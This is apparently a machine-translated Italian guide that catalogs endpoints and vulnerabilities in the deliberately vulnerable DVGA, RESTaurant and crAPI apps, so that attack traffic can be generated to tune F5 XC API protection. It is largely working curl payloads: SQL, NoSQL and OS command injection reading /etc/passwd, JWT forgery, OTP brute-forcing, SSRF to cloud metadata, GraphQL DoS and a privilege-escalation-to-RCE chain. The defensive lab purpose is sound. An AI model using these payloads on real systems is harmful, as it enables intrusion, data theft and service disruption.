---
title: Guida al Testing delle API
description: >-
  Catalogo completo degli endpoint, mappatura delle vulnerabilità e payload di
  attacco per DVGA, RESTaurant e crAPI — riferimento di onboarding per la
  generazione di traffico e lo sviluppo dei profili di protezione API F5 XC
sidebar:
  order: 8
i18n:
  sourceHash: 884e2d1be2b7
  translator: machine
---

## Panoramica

Questa guida cataloga ogni endpoint API, vulnerabilità intenzionale e payload di attacco nelle tre applicazioni di test per la sicurezza delle API. Utilizzatela per costruire pattern di generazione del traffico per lo sviluppo dei profili di protezione API F5 XC.

| Applicazione | Protocollo | Percorso | Porta | Autenticazione | Vulnerabilità |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | Nessuna (admin: admin/password) | 25 scenari |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 categorie OWASP API 2023 |
| **crAPI** | REST (microservizi) | `/` | 8888 | JWT (Bearer) | 18+ sfide |

### Variabili d'Ambiente

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

---

## DVGA (Damn Vulnerable GraphQL Application)

**Endpoint GraphQL:** `POST ${ORIGIN}/dvga/graphql`
**IDE GraphiQL:** `GET ${ORIGIN}/dvga/`
**Credenziali Admin:** admin / password

Tutte le interazioni DVGA utilizzano un singolo endpoint (`/dvga/graphql`) con richieste POST contenenti payload JSON `{"query":"..."}`.

### Panoramica dello Schema

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← riferimento circolare
```

### Riferimento degli Endpoint

| Operazione | Tipo | Auth | Scopo |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | No | Elenco paste (SQL injection tramite filter) |
| `paste(id)` | Query | No | Ottieni singola paste |
| `me(token)` | Query | No | Ottieni utente tramite JWT (vulnerabile a falsificazione) |
| `systemHealth` | Query | No | Controllo stato di salute |
| `systemUpdate` | Query | No | Query lenta (~82s, vettore DoS) |
| `systemDiagnostics(cmd)` | Query | admin/password | Esecuzione comandi OS nella whitelist |
| `createPaste(title, content, public)` | Mutation | No | Crea paste (XSS tramite content) |
| `importPaste(host, port, path, scheme)` | Mutation | No | Importa paste remota (SSRF, command injection) |
| `uploadPaste(filename, content)` | Mutation | No | Carica paste (path traversal) |

### Catalogo delle Vulnerabilità

#### 1. Denial of Service (6 scenari)

**Attacco Batch Query:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**Ricorsione Profonda (riferimenti circolari Owner/Paste):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**Query ad Alto Consumo di Risorse (risposta ~82 secondi):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**Duplicazione di Campi (ripetere il campo 500+ volte):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**Attacco basato su Alias (1000 operazioni con alias):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. Divulgazione di Informazioni (5 scenari)

**Introspezione (enumerazione completa dello schema):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**Suggerimenti sui Campi (un errore di battitura rivela campi validi):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF tramite importPaste (sondaggio servizi interni):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. Injection (4 scenari)

**SQL Injection tramite parametro filter:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**Stored XSS tramite createPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**Log Injection (spoofing del nome operazione):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. Esecuzione di Codice (3 scenari)

**OS Command Injection tramite importPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**Comando OS tramite systemDiagnostics (richiede autenticazione admin):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. Bypass dell'Autorizzazione (3 scenari)

**Falsificazione Token JWT (accetta token non firmati):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**Scrittura Arbitraria di File tramite uploadPaste (path traversal):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

---

## API RESTaurant (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**Specifica OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
**Autenticazione:** JWT tramite POST form-encoded a `/restaurant/token`
**Ruoli:** Customer (predefinito), Employee, Chef (admin)

### Configurazione: Registrazione e Autenticazione

```bash
# Registra un utente di test
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Ottieni token JWT (NOTA: form-encoded, non JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### Riferimento degli Endpoint

| Endpoint | Metodo | Auth | Ruolo | Vulnerabilità |
|---|---|---|---|---|
| `/restaurant/register` | POST | No | — | Creazione utente |
| `/restaurant/token` | POST | No | — | JWT con segreto debole (97952) |
| `/restaurant/healthcheck` | GET | No | — | Controllo stato di salute |
| `/restaurant/profile` | GET | Sì | Qualsiasi | Profilo utente |
| `/restaurant/profile` | PUT | Sì | Qualsiasi | **BOLA** (modifica altri utenti) |
| `/restaurant/profile` | PATCH | Sì | Qualsiasi | **BOPLA** (assegnazione massiva del ruolo) |
| `/restaurant/users/update_role` | PUT | Sì | Qualsiasi | **BFLA** (escalation del ruolo) |
| `/restaurant/menu` | GET | Sì | Qualsiasi | Elenco voci menu |
| `/restaurant/menu` | PUT | Sì | Employee+ | Crea menu (**SSRF** tramite immagine) |
| `/restaurant/menu/{item_id}` | PUT | Sì | Employee+ | Aggiorna menu (**SSRF** tramite immagine) |
| `/restaurant/menu/{item_id}` | DELETE | Sì | Qualsiasi | **BFLA** (qualsiasi utente può eliminare) |
| `/restaurant/orders` | GET | Sì | Qualsiasi | **BOLA** (visualizza tutti gli ordini) |
| `/restaurant/orders` | POST | Sì | Qualsiasi | Crea ordine |
| `/restaurant/orders/{order_id}` | GET | Sì | Qualsiasi | **BOLA** (accesso ad altri ordini) |
| `/restaurant/orders/status/{order_id}` | GET | Sì | Qualsiasi | Stato ordine |
| `/restaurant/admin/stats/disk` | GET | Sì | Chef | **Command injection** |
| `/restaurant/reset-password` | POST | No | — | Richiesta reset password |
| `/restaurant/reset-password/new-password` | POST | No | — | Imposta nuova password |
| `/restaurant/referral-code` | GET | Sì | Qualsiasi | Ottieni codice referral |
| `/restaurant/apply-referral` | POST | Sì | Qualsiasi | Applica referral |
| `/restaurant/discount-coupons` | GET | Sì | Qualsiasi | Elenco coupon |

### Catalogo delle Vulnerabilità

#### API1:2023 — Broken Object Level Authorization (BOLA)

**Modifica del profilo di un altro utente:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**Accesso agli ordini di altri utenti (enumerazione offset):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — Autenticazione Compromessa

**Brute-force del segreto debole JWT (il segreto è di 6 cifre: 97952):**
```bash
# Decodifica e falsifica token su jwt.io
# Segreto: 97952 (attaccabile con brute-force tramite hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Falsifica un token Chef:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Firma con segreto: 97952
```

#### API3:2023 — Broken Object Property Level Authorization (BOPLA)

**Assegnazione massiva del ruolo da Customer a Chef:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**Percorso di escalation: Customer → Employee → Chef:**
```bash
# Passo 1: Escalation a Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Passo 2: Escalation a Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — Broken Function Level Authorization (BFLA)

**Eliminazione voce menu come Customer (dovrebbe richiedere Employee+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**Modifica del ruolo di un altro utente:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — Server-Side Request Forgery (SSRF)

**Sondaggio endpoint interni tramite image_url del menu (richiede ruolo Employee):**
```bash
# Prima escalation a Employee tramite BOPLA, poi:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — Injection

**OS Command Injection tramite statistiche disco (richiede ruolo Chef):**
```bash
# Dopo l'escalation a Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### Catena di Attacco Completa: Da Customer a Root

```bash
# 1. Registrazione
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Ottieni token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalation a Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Ri-autenticazione per ottenere token di livello Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Command injection (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## crAPI (OWASP Completely Ridiculous API)

**Interfaccia Web:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (cattura email per la verifica)
**Autenticazione:** Token JWT Bearer (RS256, vulnerabile a confusione dell'algoritmo)
**Architettura:** 7 microservizi (identity, community, workshop, postgres, mongo, mailhog, web)

### Configurazione: Registrazione, Verifica Email, Login

```bash
# 1. Registrazione
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Controlla MailHog per l'email di verifica
# Naviga a ${CRAPI}/mailhog/ o usa l'API MailHog:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Login e ottenimento token JWT
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### Riferimento degli Endpoint

#### Servizio Identity

| Endpoint | Metodo | Auth | Vulnerabilità |
|---|---|---|---|
| `/identity/api/auth/signup` | POST | No | Registrazione |
| `/identity/api/auth/login` | POST | No | Token JWT (confusione dell'algoritmo) |
| `/identity/api/auth/forget-password` | POST | No | Richiesta OTP |
| `/identity/api/auth/v2/check-otp` | POST | No | **Nessun rate limit** (brute-force OTP a 4 cifre) |
| `/identity/api/auth/v3/check-otp` | POST | No | Versione con rate limit |
| `/identity/api/v2/user/dashboard` | GET | Sì | Profilo utente |
| `/identity/api/v2/user/change-email` | PUT | Sì | Cambio email |
| `/identity/api/v2/vehicle/vehicles` | GET | Sì | Elenco veicoli (espone UUID) |
| `/identity/api/v2/vehicle/{uuid}/location` | GET | Sì | **BOLA** (veicolo di qualsiasi utente) |
| `/identity/api/v2/user/videos` | POST | Sì | Caricamento video |
| `/identity/api/v2/user/videos/{id}` | GET | Sì | **Esposizione dati** (conversion_params) |
| `/identity/api/v2/user/videos/{id}` | PUT | Sì | **Mass assignment** (command injection) |
| `/identity/api/v2/admin/videos/{id}` | DELETE | Sì | **BFLA** (nessun controllo admin) |

#### Servizio Community

| Endpoint | Metodo | Auth | Vulnerabilità |
|---|---|---|---|
| `/community/api/v2/community/posts` | GET | Sì | **Esposizione dati** (espone vehicle_id, email) |
| `/community/api/v2/community/posts` | POST | Sì | Crea post del blog |
| `/community/api/v2/community/posts/{id}/comments` | POST | Sì | Aggiungi commento |
| `/community/api/v2/coupon/validate-coupon` | POST | Sì | **NoSQL injection** |

#### Servizio Workshop

| Endpoint | Metodo | Auth | Vulnerabilità |
|---|---|---|---|
| `/workshop/api/mechanic` | GET | Sì | **Esposizione dati** (email meccanici) |
| `/workshop/api/mechanic/mechanic_report` | GET | No | **BOLA** (nessuna auth, ID sequenziali) |
| `/workshop/api/merchant/contact_mechanic` | POST | Sì | **SSRF** + **DoS** |
| `/workshop/api/shop/products` | GET | Sì | Catalogo prodotti |
| `/workshop/api/shop/orders/` | POST | Sì | Crea ordine |
| `/workshop/api/shop/orders/all` | GET | Sì | Elenco ordini |
| `/workshop/api/shop/orders/{id}` | GET | No | **BOLA** (nessuna auth richiesta) |
| `/workshop/api/shop/orders/{id}` | PUT | Sì | **Mass assignment** (status, quantity) |
| `/workshop/api/shop/apply_coupon` | POST | Sì | **SQL injection** |

### Catalogo delle Sfide

#### Sfida 1 — BOLA: Accesso alla Posizione del Veicolo di un Altro Utente

```bash
# Ottieni prima l'UUID del tuo veicolo
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# Accedi al veicolo di un altro utente (sostituisci UUID)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### Sfida 2 — BOLA: Accesso ai Report dei Meccanici (Senza Auth)

```bash
# Enumerazione ID sequenziali — nessun token necessario
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### Sfida 3 — Autenticazione Compromessa: Brute-Force dell'OTP per Reset Password

```bash
# Richiedi OTP per la vittima
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Brute-force OTP a 4 cifre (v2 NON ha rate limiting)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### Sfida 4 — Esposizione Dati: Esfiltrare Email dei Meccanici

```bash
curl -sf ${CRAPI}/workshop/api/mechanic \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
```

#### Sfida 5 — Esposizione Dati: Parametri Interni di Conversione Video

```bash
# Carica un video, poi ispeziona la risposta
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# Cerca il campo conversion_params nella risposta
```

#### Sfida 6 — DoS: Layer 7 tramite Contact Mechanic

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"Engine issue",
    "vin":"VEHICLE_VIN",
    "mechanic_api":"http://localhost:8080/api",
    "repeat_request_if_failed":true,
    "number_of_repeats":100
  }'
```

#### Sfida 7 — BFLA: Eliminazione Video tramite Endpoint Admin

```bash
# Un utente normale può accedere all'endpoint admin
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### Sfide 8 e 9 — Mass Assignment: Articoli Gratuiti tramite Manipolazione Ordini

```bash
# Cambia GET in PUT, modifica status e quantity
curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned","quantity":100}'
```

#### Sfida 10 — Command Injection tramite Parametri di Conversione Video

```bash
curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
```

#### Sfida 11 — SSRF tramite Contact Mechanic

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"test",
    "vin":"VIN123",
    "mechanic_api":"http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed":false,
    "number_of_repeats":0
  }'
```

#### Sfida 12 — NoSQL Injection: Estrazione Codici Coupon

```bash
curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":1}}'
```

#### Sfida 13 — SQL Injection: Riscatto Multiplo dei Coupon

```bash
curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
```

#### Sfida 14 — Accesso agli Ordini Senza Autenticazione

```bash
# Nessun header Authorization — restituisce comunque i dati
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
  echo ""
done
```

#### Sfida 15 — Confusione dell'Algoritmo JWT

```bash
# Falsifica un JWT con algoritmo "none" (nessuna verifica della firma):
# 1. Imposta header: {"alg":"none","typ":"JWT"} e codificalo in base64url
# 2. Imposta payload: {"email":"admin@example.com","role":"admin"} e codificalo in base64url
# 3. Unisci con punti, lascia la firma vuota: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

---

## Riferimento Incrociato OWASP API Security Top 10

| Categoria OWASP | DVGA | RESTaurant | crAPI |
|---|---|---|---|
| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Posizione veicolo, report meccanici, ordini |
| **API2: Autenticazione Compromessa** | Falsificazione JWT (query `me`) | Segreto JWT debole (97952) | Brute-force OTP (v2), confusione algoritmo JWT |
| **API3: BOPLA** | — | `PATCH /profile` (escalation del ruolo) | Video conversion_params, esposizione email meccanici |
| **API4: Consumo di Risorse** | Batch, ricorsione, alias, duplicazione campi DoS | Enumerazione utenti tramite lunghezza risposta | `contact_mechanic` repeat_request DoS |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` come utente normale |
| **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | Status/quantity ordine, video conversion_params |
| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | `contact_mechanic` URL mechanic_api |
| **API8: Injection** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
| **API9: Gestione Impropria degli Asset** | — | — | `/auth/v2/check-otp` deprecato (nessun rate limit) |
| **API10: Consumo Non Sicuro** | — | — | (indiretto tramite SSRF) |
| **Specifico GraphQL** | Introspezione, batching, ricorsione, alias, duplicazione campi, frammenti circolari | — | — |

---

## Pattern di Generazione del Traffico

### Fase 1: Baseline (Percorso Felice)

Genera traffico legittimo per stabilire il comportamento normale dell'API prima di testare i pattern di attacco.

**Baseline DVGA:**
```bash
# Query normali
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**Baseline RESTaurant:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**Baseline crAPI:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### Fase 2: Traffico di Attacco per Categoria OWASP

**Test BOLA:** Enumerare ID sequenziali, scambiare identificatori utente nelle richieste, accedere a risorse senza proprietà.

**Test Injection:** Payload SQL nei parametri filter/coupon, injection nelle query GraphQL, OS command injection tramite campi parametro.

**Test bypass autenticazione:** Falsificazione token JWT, brute-force OTP, utilizzo di versioni API deprecate, confusione dell'algoritmo.

**Test SSRF:** URL interni nei parametri `importPaste`, `image_url` e `mechanic_api`.

**Test DoS:** Attacchi GraphQL batch/ricorsione/alias, `repeat_request_if_failed` con conteggi elevati.

### Fase 3: Catene di Attacco Stateful

Alcuni attacchi richiedono sequenze multi-step con stato:

1. **Catena di escalation RESTaurant:** Registrazione → Token → PATCH ruolo a Chef → Ri-autenticazione → Command injection
2. **Flusso completo crAPI:** Signup → Verifica email (MailHog) → Login → Aggiungi veicolo → Contatta meccanico (SSRF) → Manipolazione ordini
3. **Da ricognizione a exploit DVGA:** Introspezione → Scoperta systemDiagnostics → Brute-force credenziali admin → Esecuzione comandi OS

### Raccomandazioni sulle Frequenze

| Pattern | Richieste/sec | Durata | Note |
|---|---|---|---|
| Baseline (per app) | 10-50 | 5 min | Stabilire l'impronta del traffico normale |
| Enumerazione BOLA | 100-500 | 2 min | Scansione ID sequenziali |
| Brute-force OTP | 1000+ | Fino al trovamento | 10.000 tentativi massimi (4 cifre) |
| DoS GraphQL | 10-50 | 30 sec | Ogni richiesta è costosa lato server |
| Fuzzing injection | 50-200 | 5 min | Variare i payload per richiesta |
| Sondaggio SSRF | 5-20 | 2 min | Lento; ogni richiesta attiva una richiesta HTTP lato server |
